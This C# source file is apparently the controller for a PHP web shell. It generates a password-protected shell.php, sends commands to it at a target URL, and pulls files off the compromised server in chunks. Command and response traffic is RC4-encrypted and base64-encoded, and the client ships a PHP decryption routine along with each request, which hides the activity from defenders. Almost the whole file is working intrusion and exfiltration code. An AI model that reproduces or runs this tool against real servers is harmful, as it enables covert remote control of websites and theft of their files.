using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Text;
using System.Net;
using System.Threading;
using System.Security.Cryptography;
using System.IO;
using PHPShellEncryption;

namespace PHPShell
{
    public delegate void StatusEvent(string status);

    public class PHPShell
    {
        ShellURL url;
        List<string> commands = new List<string>();
        int currentCommandPositon = -1;
		string encMethod = "$key[] = '';$box[] = '';$cipher = '';$pwd_length = strlen($pwd);$data_length = strlen($data);for ($i = 0; $i < 256; $i++){$key[$i] = ord($pwd[$i % $pwd_length]);$box[$i] = $i;}for ($j = $i = 0; $i < 256; $i++){$j = ($j + $box[$i] + $key[$i]) % 256;$tmp = $box[$i];$box[$i] = $box[$j];$box[$j] = $tmp;}for ($a = $j = $i = $f = 0; $i < $data_length; $i++){$a = ($a + 1) % 256;$j = ($j + $box[$a]) % 256;$f = ($f + $box[$j]) % 256;$tmp = $box[$a];$box[$a] = $box[$j];$box[$j] = $tmp;$tmp = $box[$a];$box[$a] = $box[$f];$box[$f] = $tmp;$k = $box[($box[(($box[$a] + $box[$j]) % 256)] + $box[$f]) % 256];$cipher .= chr(ord($data[$i]) ^ $k);}return $cipher;";

        public event StatusEvent NewStatusToReport;

        public void AddCommand(string command)
        {
            if (command != "")
            {
                if (currentCommandPositon == -1 || currentCommandPositon == commands.Count)
                {
                    commands.Add(command);
                    currentCommandPositon = commands.Count;
                }
            }
        }

        public string GetLastCommand()
        {
            if (currentCommandPositon == -1)
                return "";
            if (currentCommandPositon != 0)
                currentCommandPositon--;
            return commands[currentCommandPositon];
        }

        public string GetNextCommand()
        {
            if (currentCommandPositon == -1)
                return "";
            if (currentCommandPositon > commands.Count - 1)
                return "";
            if (currentCommandPositon != commands.Count)
                currentCommandPositon++;
            if (currentCommandPositon > commands.Count - 1)
                return "";
            return commands[currentCommandPositon];
        }

        void OnNewStatusEvent(string status)
        {
            if (NewStatusToReport != null)
                NewStatusToReport(status);
        }

        public string[] TabComplete(string currentCommand)
        {
            return new string[0];
        }

        public PHPShell(ShellURL url)
        {
            this.url = url;
			encMethod = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(encMethod));
            GenerateShell();
        }

        void GenerateShell()
        {
            string p = BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(ASCIIEncoding.ASCII.GetBytes(url.URL))).Replace("-", "");
            if (!Directory.Exists(Configuration.Instance.DataFolder))
                Directory.CreateDirectory(Configuration.Instance.DataFolder);
            if (!Directory.Exists(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + p))
                Directory.CreateDirectory(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + p);
            File.WriteAllText(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + p + Path.DirectorySeparatorChar + "shell.php", Generator.GenerateShell(url.PreString, url.Password));
        }

        public void LoadPreviousCommands()
        {
            string p = BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(ASCIIEncoding.ASCII.GetBytes(url.URL))).Replace("-", "");
            if (!Directory.Exists(Configuration.Instance.DataFolder))
                Directory.CreateDirectory(Configuration.Instance.DataFolder);
            if (!Directory.Exists(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + p))
                Directory.CreateDirectory(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + p);
            if (File.Exists(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + p + Path.DirectorySeparatorChar + "Commands.log"))
            {
                foreach (string s in File.ReadAllLines(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + p + Path.DirectorySeparatorChar + "Commands.log"))
                    commands.Add(s);
                currentCommandPositon = commands.Count;
                OnNewStatusEvent("Loaded " + commands.Count + " previous commands.");
            }
        }

        private void AppendNewCommand(string file, string command)
        {
            if (!Directory.Exists(Configuration.Instance.DataFolder))
                Directory.CreateDirectory(Configuration.Instance.DataFolder);
            if (!Directory.Exists(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + file))
                Directory.CreateDirectory(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + file);
            File.AppendAllText(Configuration.Instance.DataFolder + Path.DirectorySeparatorChar + file + Path.DirectorySeparatorChar + "Commands.log", command + "\r\n");
        }

		private byte[] FindResponse(byte[] rawresponse)
		{
			string fullStr = ASCIIEncoding.ASCII.GetString(rawresponse);
            fullStr = fullStr.Substring(fullStr.IndexOf("<--" + url.PreString) + 3 + url.PreString.Length);
			fullStr = fullStr.Substring(0, fullStr.IndexOf("-->"));
			return ASCIIEncoding.ASCII.GetBytes(fullStr);
		}
		
        public string ProcessCommand(string command)
        {
            commands.Add(command);
            AppendNewCommand(BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(ASCIIEncoding.ASCII.GetBytes(url.URL))).Replace("-", ""), command);
            currentCommandPositon = commands.Count;
            if (command.StartsWith("download"))
            {
                string[] args = command.Split(' ');
                if (args.Length >= 3)
                {
                    Thread t = new Thread(new ParameterizedThreadStart(DownloadFile));
                    t.Start(args);
                    return "File download started.";
                }
                else
                {
                    OnNewStatusEvent("download command failed.");
                    return "download requires at least 2 arguments.";
                }
            }
            else
            {
                try
                {
					RC4 rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(url.Password));
					WebClient client = new WebClient();
					NameValueCollection nvc = new NameValueCollection();
					nvc.Add("k", url.Password);
					nvc.Add("a", rc4.EncryptAndEncode(ASCIIEncoding.ASCII.GetBytes(command)));
					nvc.Add("enc", encMethod);
					byte[] response = FindResponse(client.UploadValues(url.URL, "POST", nvc));
                    rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(url.Password));
                    string ret = UTF8Encoding.UTF8.GetString(rc4.DecodeAndDecrypt(response)).Replace("\n", "\r\n");
                    OnNewStatusEvent("Command returned " + ret.Length + " bytes.");
                    return ret;
                }
                catch(Exception e)
                {
                    OnNewStatusEvent("Command failed");
                    return e.Message;
                }
            }
        }

        void DownloadFile(object o)
        {
            string[] args = (string[])o;
            try
            {
                RC4 rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(url.Password));
                WebClient client = new WebClient();
				NameValueCollection nvc = new NameValueCollection();
                nvc.Add("k", url.Password);
				nvc.Add("fs", rc4.EncryptAndEncode(ASCIIEncoding.ASCII.GetBytes(args[1])));
				nvc.Add("enc", encMethod);
				int filesize = 0;
				byte[] fs = FindResponse(client.UploadValues(url.URL, "POST", nvc));
                rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(url.Password));
				filesize = int.Parse(ASCIIEncoding.ASCII.GetString(rc4.DecodeAndDecrypt(fs)));

                rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(url.Password));
				nvc = new NameValueCollection();
                nvc.Add("k", url.Password);
				nvc.Add("fh", rc4.EncryptAndEncode(ASCIIEncoding.ASCII.GetBytes(args[1])));
				nvc.Add("enc", encMethod);
                rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(url.Password));
				string filehash = ASCIIEncoding.ASCII.GetString(rc4.DecodeAndDecrypt(FindResponse(client.UploadValues(url.URL, "POST", nvc))));
				if(File.Exists(args[2]))
					File.Delete(args[2]);
				FileStream files = File.Create(args[2]);
				MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
				for(int x = 0; x < filesize; x += 1024)
				{
                    rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(url.Password));
					nvc = new NameValueCollection();
                    nvc.Add("k", url.Password);
					nvc.Add("d", rc4.EncryptAndEncode(ASCIIEncoding.ASCII.GetBytes(args[1])));
					nvc.Add("p", x.ToString());
					nvc.Add("enc", encMethod);
                    rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(url.Password));
					byte[] readin = rc4.DecodeAndDecrypt(FindResponse(client.UploadValues(url.URL, "POST", nvc)));
					files.Write(readin, 0, readin.Length);
				}
				files.Close();
				Stream filestream = new FileStream(args[2], FileMode.Open, FileAccess.Read);
				byte[] result = md5.ComputeHash(filestream);
				if(filehash != BitConverter.ToString(result).Replace("-","").ToLower())
				{
					OnNewStatusEvent(args[1] + " file hashes do not match. " + filehash + " != " + BitConverter.ToString(result).Replace("-","").ToLower());
					return;
				}
                OnNewStatusEvent(args[1] + " finished downloading to " + args[2]);
            }
            catch(Exception e)
            {
                OnNewStatusEvent("Error in downloading file: " + e.Message);
            }
        }
    }
}
